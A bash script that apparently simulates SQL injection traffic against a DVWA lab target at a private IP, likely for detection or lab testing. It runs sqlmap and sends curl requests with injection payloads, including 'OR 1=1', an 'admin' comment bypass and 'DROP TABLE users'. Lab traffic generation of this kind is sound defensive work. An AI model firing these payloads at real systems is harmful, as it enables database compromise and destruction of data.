#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"

echo "[run_id=$RUN_ID] SQL injection simulation starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
sqlmap -u "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=1 --risk=1 --timeout=5 --retries=1 2>/dev/null || true
curl -s "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1+OR+1=1--&Submit=Submit" -o /dev/null || true
curl -s "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=';+DROP+TABLE+users;--&Submit=Submit" -o /dev/null || true
curl -s "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=admin'--&Submit=Submit" -o /dev/null || true
echo "[run_id=$RUN_ID] SQL injection simulation done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"